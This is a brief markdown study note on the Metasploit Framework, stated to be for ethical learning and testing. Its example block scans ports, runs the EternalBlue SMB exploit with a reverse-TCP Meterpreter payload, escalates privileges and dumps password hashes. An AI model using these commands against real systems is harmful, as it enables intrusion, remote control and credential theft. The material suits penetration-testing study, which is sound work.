# Metasploit

Detailed exploration of the Metasploit Framework, including modules, payloads, exploits, and post-exploitation techniques. Covers how to identify vulnerabilities, launch exploits, maintain access, and pivot within a network.

**Purpose**: To understand how real attacks are executed and to simulate exploitation in a controlled and ethical environment for learning and testing.

---

## Key Concepts

- Modules
- Payloads
- Exploits
- Post-exploitation
- Vulnerability Identification
- Access Maintenance
- Network Pivoting

---

## Examples

```bash
# Scan for vulnerabilities
use auxiliary/scanner/portscan/tcp
set RHOSTS [IP_ADDRESS]
run

# Launch exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP_ADDRESS]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [IP_ADDRESS]
run

# Post-exploitation
getsystem
load kiwi
meterpreter > hashdump
```

